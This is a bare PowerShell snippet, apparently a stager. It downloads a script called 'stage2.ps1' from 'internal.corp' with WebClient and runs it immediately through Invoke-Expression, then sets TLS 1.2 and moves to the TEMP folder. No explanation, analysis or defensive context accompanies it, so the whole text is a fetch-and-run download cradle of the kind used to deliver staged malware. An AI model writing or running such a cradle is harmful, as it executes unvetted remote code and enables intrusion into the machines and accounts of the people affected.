$DownloadUrl = 'https://internal.corp/stage2.ps1'
$ScriptText = (New-Object System.Net.WebClient).DownloadString($DownloadUrl)
IEX $ScriptText
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Location -Path $env:TEMP
